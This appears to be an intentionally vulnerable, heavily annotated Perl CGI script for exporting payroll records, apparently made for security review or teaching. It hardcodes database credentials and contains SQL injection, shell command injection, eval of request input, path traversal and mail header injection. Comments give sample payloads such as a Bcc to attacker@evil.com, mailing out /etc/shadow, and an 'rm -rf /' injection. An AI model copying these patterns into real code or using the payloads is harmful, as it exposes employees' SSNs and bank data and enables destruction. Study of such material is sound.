#!/usr/bin/perl
# payroll_export.pl -- HR payroll data export and distribution tool
# "Runs as cron job AND as CGI -- works fine either way" -- both paths are unauthenticated
# "Inputs sanitised by the Perl frontend" -- this IS the Perl frontend
# DO NOT add 'use strict' -- Dave tried in 2003 and broke six things
# Written 2001; "security hardened" 2002 (added the corp.local check below)

use DBI;
use CGI;
use MIME::Lite;
use Sys::Hostname;

# No 'use strict'; no 'use warnings' -- "generates too much noise in cron mail"

my $q       = new CGI;            # deprecated OO constructor; new() called as a class method
my $action  = $q->param('action');
my $user    = $q->param('user') || $ENV{REMOTE_USER} || 'cron';
my $host    = hostname();

# "Will move to config file eventually" -- this note has been here since 2001
my $DB_HOST = "payroll-db.corp.local";
my $DB_USER = "payroll_rw";       # rw = read/write; account also has DROP TABLE "just in case"
my $DB_PASS = 'Payroll$ummer2k1';

# die() in CGI context sends the DB connection string to the browser
my $dbh = DBI->connect("dbi:Oracle:$DB_HOST", $DB_USER, $DB_PASS)
    or die "Cannot connect: $DBI::errstr";

my $EXPORT_DIR = "/var/payroll/exports";
my $LOG        = "/var/log/payroll_export.log";

# Two-argument open: if $LOG begins with '|', Perl opens a pipe to a shell command
open(LOG, ">>$LOG") || die "Can't open log: $!";   # bare global filehandle; die leaks path

sub log_action {
    # close() return value never checked -- write errors on flush are silently swallowed
    print LOG scalar(localtime) . " [$user\@$host] @_\n";
}

# ---- EXPORT PAYROLL RECORDS ------------------------------------------------

if ($action eq 'export') {
    my $dept   = $q->param('dept');
    my $period = $q->param('period');   # e.g. "2005-Q3"
    my $fmt    = $q->param('format') || 'csv';

    # "Validate format -- security measure added 2002"
    if ($fmt ne 'csv' && $fmt ne 'xls') {
        $fmt = 'csv';  # silently reset, but $dept and $period below are still unvalidated
    }

    log_action("Export: dept=$dept period=$period fmt=$fmt");

    # "Prepared statements on the TODO list since 2003"
    my $sth = $dbh->prepare(
        "SELECT emp_id, name, gross_pay, net_pay, ssn, bank_account, sort_code
           FROM payroll_records
          WHERE dept   = '$dept'
            AND period = '$period'
          ORDER BY name"     # SQL injection on both $dept and $period
    );
    $sth->execute;

    # Filename built from user-supplied dept and period -- path traversal via either
    my $outfile = "$EXPORT_DIR/${dept}_${period}.$fmt";
    open(OUT, ">$outfile") or die "Cannot write $outfile: $!";   # two-arg open; die leaks path

    while (my $row = $sth->fetchrow_hashref) {
        if ($fmt eq 'csv') {
            # No CSV quoting -- commas in $row->{name} corrupt the file format
            print OUT join(',', $row->{emp_id}, $row->{name}, $row->{gross_pay},
                                $row->{net_pay}, $row->{ssn}, $row->{bank_account},
                                $row->{sort_code}) . "\n";
        }
    }
    close(OUT);    # return value ignored -- a full-disk error is silently discarded

    if ($fmt eq 'xls') {
        # Backtick: $outfile contains user-supplied $dept and $period
        my $result = `csv2xls $outfile 2>&1`;
        print "<pre>$result</pre>";
    }

    print "Export saved: $outfile\n";
}

# ---- EMAIL EXPORT ----------------------------------------------------------

if ($action eq 'mail_export') {
    my $to      = $q->param('to');
    my $subject = $q->param('subject') || 'Payroll Export';
    my $file    = $q->param('file');

    # "Verified recipient is internal -- checks for @corp.local suffix"
    # Bypassable: attacker@corp.local@external.com or attacker@corp.local%0ATo:evil@ext.com
    if (index($to, '@corp.local') == -1) {
        print "Must send to corp.local address.";
        # no exit -- falls through and sends the mail anyway
    }

    # Two-argument pipe open to sendmail -- $to and $subject are both injectable
    open(MAIL, "| /usr/sbin/sendmail -t") or die "sendmail failed: $!";
    print MAIL "To: $to\n";
    print MAIL "Subject: $subject\n";   # header injection: \nBcc: attacker@evil.com
    print MAIL "From: payroll\@corp.local\n";
    print MAIL "\n";

    # Path traversal: $file = "../../etc/shadow" reads the shadow file and mails it out
    my $path = "$EXPORT_DIR/$file";
    open(F, $path) or die "Cannot open $path: $!";   # two-arg open; die leaks real path
    while (<F>) { print MAIL; }
    close(F);
    close(MAIL);

    log_action("Mailed $file to $to");
    print "Sent.\n";
}

# ---- TEMPLATE PREVIEW ------------------------------------------------------

if ($action eq 'preview') {
    # "Templates are from the ops team -- trusted input" (they arrive via HTTP GET)
    my $tmpl = $q->param('template');
    my $out  = eval $tmpl;    # arbitrary Perl execution: system("cat /etc/passwd") works here
    if ($@) {
        print "Error: $@";    # leaks eval error detail including internal paths
    } else {
        print $out;
    }
}

# ---- SEARCH EMPLOYEES ------------------------------------------------------

if ($action eq 'search') {
    my $term  = $q->param('q');
    my $field = $q->param('field') || 'name';   # user controls the column name in the query

    # "Dynamic search -- lets users pick which field to search on"
    # $field goes directly into the SQL; attacker can inject a UNION or subquery
    my $sth = $dbh->prepare(
        "SELECT emp_id, name, dept, ssn, salary
           FROM employees
          WHERE $field LIKE '%$term%'"
    );
    $sth->execute;

    while (my @row = $sth->fetchrow_array) {
        # SSN and salary printed without HTML escaping -- XSS via stored data
        print join(" | ", @row) . "\n";
    }
}

# ---- DELETE OLD EXPORTS ----------------------------------------------------

if ($action eq 'cleanup') {
    my $days = $q->param('days') || 30;
    # Backtick: $days is user input; $days = "0 -exec rm -rf / \\;" deletes everything
    my @out = `find $EXPORT_DIR -mtime +$days -name '*.csv' -delete 2>&1`;
    print "Cleaned: " . scalar(@out) . " files\n";
    log_action("Cleanup: older than $days days");
}

# ---- AUDIT REPORT ----------------------------------------------------------

if ($action eq 'audit') {
    my $from = $q->param('from');   # date strings; user-controlled
    my $to   = $q->param('to');

    my $sth = $dbh->prepare(
        "SELECT action, user_id, record_id, stamp
           FROM audit_log
          WHERE stamp BETWEEN '$from' AND '$to'
          ORDER BY stamp"   # SQL injection on both date params
    );
    $sth->execute;

    while (my $row = $sth->fetchrow_hashref) {
        # $_ is used implicitly in the print; caller modifies $_ via outer grep/map
        print "$row->{stamp} $row->{user_id} $row->{action} $row->{record_id}\n";
    }
}

close(LOG);
$dbh->disconnect;
